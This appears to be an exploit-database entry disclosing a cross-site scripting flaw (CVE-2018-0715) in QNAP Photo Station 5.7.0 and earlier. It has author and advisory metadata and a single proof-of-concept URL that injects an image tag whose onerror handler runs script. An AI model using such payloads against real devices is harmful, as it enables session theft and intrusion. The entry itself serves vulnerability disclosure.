# Exploit Title: QNAP Photo Station 5.7.0 - Cross-Site Scripting
# Google Dork: N/A
# Date: 2018-09-07
# Exploit Author: Mitsuaki (Mitch) Shiraishi - secureworks
# Vendor Homepage: https://www.qnap.com/ja-jp/security-advisory/nas-201808-23
# Software Link: N/A
# Version: QNAP Photo Station versions 5.7.0 and earlier
# Tested on: N/A
# CVE : CVE-2018-0715

# PoC: 

https://***.***.***.***:8080/photo/abc/<img%20src%3Da.jpg%20onerror%3D%22alert(1)%22>.txt